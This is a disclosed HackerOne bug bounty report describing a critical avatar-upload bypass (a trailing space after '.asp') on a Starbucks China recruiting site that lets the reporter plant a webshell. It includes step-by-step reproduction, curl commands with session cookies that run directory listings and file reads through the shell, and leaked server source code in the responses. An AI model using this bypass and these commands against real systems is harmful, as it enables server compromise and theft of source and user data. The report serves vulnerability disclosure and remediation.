# Webshell via File Upload on ecjobs.starbucks.com.cn

## Report Details
- **Report ID**: 506646
- **URL**: https://hackerone.com/reports/506646
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-03-08T06:45:11.342Z
- **Disclosed**: 2019-11-13T00:38:41.593Z

## Reporter
- **Username**: johnstone
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
**Summary:** 
OS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.

**Description:** 
I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.

## Steps To Reproduce:

  1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.
  2. Use burp suite tools to interupt the avatar upload request.
  3. Replace the filename type ```.jpg``` to ```asp ```which have a space character behind and modify the content

  After that you have uploaded malicious files on the server and run any os command on server you wanted.
Do some command like list all files on the server

```
curl -i -s -k  -X $'GET' \
    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
```

**The response content:**

```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 02:56:19 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 1814533

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
d:\TrustHX\STBKSERM101\www_app\bin
d:\TrustHX\STBKSERM101\www_app\common
d:\TrustHX\STBKSERM101\www_app\concurrent_test
d:\TrustHX\STBKSERM101\www_app\Default.aspx
d:\TrustHX\STBKSERM101\www_app\Global.asax
d:\TrustHX\STBKSERM101\www_app\hximages_v6
....................................
</textarea>
</body>
</html>
```

**Show the internal source code**
```
curl -i -s -k  -X $'GET' \
    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\\new_application_concurrent_test__svc.cs'
```
the source code respones:
```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 03:37:39 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 33316

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
ï»¿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Data;
using System.Configuration;
using System.Xml;
using System.Transactions;
using System.Text;
using System.Threading;
using System.Web;

using TrustHX.IHXEIMS6;
using hxsys = TrustHX.HXEIMS6;
using hxwww = TrustHX.HXWWW6;
using hxsm = TrustHX.HXSM6;
using hxmd = TrustHX.HXMD6;


class new_application_concurrent_test : IHXPageXmlService
{
    #region IHXPageXmlService æå
    string IHXPageXmlService.Run(string strSystemCode, string strPageXmlServiceCode, string strPageXmlServiceContent, string strHXPageParamUUID, string strHXPageName)
    {
        try
        {
            switch (strPageXmlServiceCode)
            {
                case "PREPARE_CONCURRENT_DATA":return ConcurrentDataPrepare.ConcurrentDataPrepareProcess(strSystemCode, strPageXmlServiceContent);
                case "CONCURRENT_TEST":return ConcurrentTest.ConcurrentTestProcess(strSystemCode, strPageXmlServiceContent);
                default:
                    string strErrorMessageText =
....................................
</textarea>
</body>
</html>
```

## Recommendations for fix

*Strictly limit file upload types
*Only allow jpg/png/gif/jpeg file parsing on the uploaded fiels
*More safe code design

Thks!Looking forward to your reply.
With kind regards
John stone

## Impact

disclosures  the internal source code data and user's information,broken ring server,etc.

## Attachments
- intenal_source_code.png
- OS_CMD.png
